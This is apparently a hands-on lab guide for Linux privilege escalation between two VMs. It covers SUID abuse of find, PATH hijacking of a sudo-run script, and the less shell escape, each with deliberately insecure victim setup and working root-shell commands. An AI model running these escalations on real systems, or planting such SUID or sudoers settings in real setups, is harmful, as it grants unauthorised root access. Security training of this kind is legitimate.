## PREREQUISITE

- Kali Linux VM as Victim machine
- Another VM OR your host Linux machine (like Manjaro Linux) as Attacker machine
- In Oracle VM VirtualBox set victim networking to:

## SUID Privilege Escalation

#### On the Victim machine - DO THIS

```
sudo useradd -m hacker_suid

sudo passwd hacker_suid

cat /etc/passwd | grep hacker_suid

sudo mkdir /opt/vuln_suid

ls -ld /opt/vuln_suid

sudo cp /usr/bin/find /opt/vuln_suid/find

ls -l /opt/vuln_suid

sudo chown root:root /opt/vuln_suid/find

ls -l /opt/vuln_suid/find

sudo chmod u+s /opt/vuln_suid/find

ls -l /opt/vuln_suid/find
```

#### On the Attacker machine - DO THIS
```
ssh hacker_suid@IP

find / -perm -4000 2>/dev/null

Go to [GTFOBins](https://gtfobins.org/)

/opt/vuln_suid/find . -exec /bin/sh -p \; -quit
```


## PATH Hijacking


#### On the Victim machine - DO THIS

```
sudo useradd -m hacker_path

sudo passwd hacker_path

sudo mkdir /opt/path_lab

sudo nano /opt/path_lab/backup.sh
```

Put this inside
```bash
#!/bin/bash

cp /etc/passwd /tmp/passwd.bak
```
```
sudo chmod +x /opt/path_lab/backup.sh
```

**Allow low privilege user to run script as root**
```
sudo visudo
```

Add: `hacker_path ALL=(ALL) NOPASSWD: /opt/path_lab/backup.sh`
Find line like: `Defaults secure_path="/usr/sbin:/usr/bin:/sbin:/bin"` and Comment it: `# Defaults secure_path="..."`

- ⚠️ Lab only — modifying sudo secure_path is intentionally insecure. Do not do on real systems.

Save.

```
su hacker_path

sudo -l
```
Expected: `(root) NOPASSWD: /opt/path_lab/backup.sh`


#### On the Attacker machine - DO THIS
```
ssh hacker_path@ip

sudo -l
```
you'll see : `(ALL) NOPASSWD: /opt/path_lab/backup.sh`
```
cat /opt/path_lab/backup.sh
```
Notice `cp` is not `/bin/cp`. 
```
echo $PATH

printf '#!/bin/bash\n/bin/bash -p\n' > /tmp/cp

chmod +x /tmp/cp

export PATH=/tmp:$PATH

echo $PATH
```
Expected : `/tmp:...............`
```
sudo /opt/path_lab/backup.sh

whoami -> root
```

## Checking Sudo Rights

#### On the Victim machine - DO THIS
```
sudo useradd -m hacker_sudo
sudo passwd hacker_sudo
```
```
sudo visudo
```
Then add : `hacker_sudo ALL=(ALL) NOPASSWD: /usr/bin/less`

Save

#### On the Attacker machine - DO THIS

```
ssh hacker_sudo@ip
```
```
sudo -l
```
You'll see : `(ALL) NOPASSWD: /usr/bin/less`

Now Exploit:
```
sudo /usr/bin/less /etc/hosts
```
```
!/bin/bash
```
Got root



## Wildcard Injection

